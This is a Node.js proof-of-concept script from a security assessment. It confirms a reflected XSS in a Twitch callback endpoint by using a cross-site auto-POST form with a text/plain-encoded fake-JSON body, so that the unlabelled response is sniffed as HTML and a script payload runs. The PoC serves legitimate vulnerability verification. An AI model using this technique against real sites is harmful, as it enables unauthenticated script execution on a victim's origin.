// Reflected XSS via the Twitch callback challenge + MIME sniffing
// (SECURITY_ASSESSMENT.md — XSS-3, HIGH). twitchrouter.go writes req.Challenge with
// no Content-Type BEFORE (and regardless of) HMAC verification; Go sniffs a <script>
// body as text/html. A cross-site auto-POST form navigates the browser there and the
// script executes on the board origin. Unauthenticated.
// Usage: node security/poc/browser/xss_twitch_sniff.js [http://localhost:8080]
function loadPlaywright(){for(const p of ['playwright','/opt/node22/lib/node_modules/playwright']){try{return require(p);}catch(e){}}console.error('playwright not found; npm i -g playwright');process.exit(2);}
const { chromium } = loadPlaywright();
const http = require('http');
const base = process.argv[2] || 'http://localhost:8080';
const U = new URL(base);
function post(p,b){return new Promise((res,rej)=>{const d=Buffer.from(b);const r=http.request({host:U.hostname,port:U.port,path:p,method:'POST',headers:{'Content-Type':'application/json','Content-Length':d.length}},x=>{let s='';x.on('data',c=>s+=c);x.on('end',()=>res(s));});r.on('error',rej);r.write(d);r.end();});}
const BOOT=`window.bootstrap={Modal:class{show(){}hide(){}static getOrCreateInstance(){return new this();}},Toast:class{show(){}hide(){}static getOrCreateInstance(){return new this();}},Collapse:class{show(){}hide(){}toggle(){}static getOrCreateInstance(){return new this();}},Tooltip:class{dispose(){}},Dropdown:class{}};`;
(async()=>{
  const browser=await chromium.launch();const page=await browser.newPage();
  let fired=null; page.on('dialog',async d=>{fired=d.message();await d.dismiss();});
  const html=`<form id=f method=POST action="${base}/apps/twitch/callback" enctype="text/plain">
    <input name='{"challenge":"<script>alert(document.domain)</script>' value='"}'></form>
    <script>document.getElementById('f').submit()</script>`;
  await page.setContent(html);
  await page.waitForTimeout(2500);
  const ct=await page.evaluate(()=>document.contentType);
  await browser.close();
  if(fired!==null){console.log('[+] XSS-3 CONFIRMED — challenge sniffed as '+ct+'; script executed ('+fired+')');process.exit(0);}
  console.log('[-] not fired (contentType='+ct+')');process.exit(1);
})().catch(e=>{console.error('ERR',e.message);process.exit(1);});
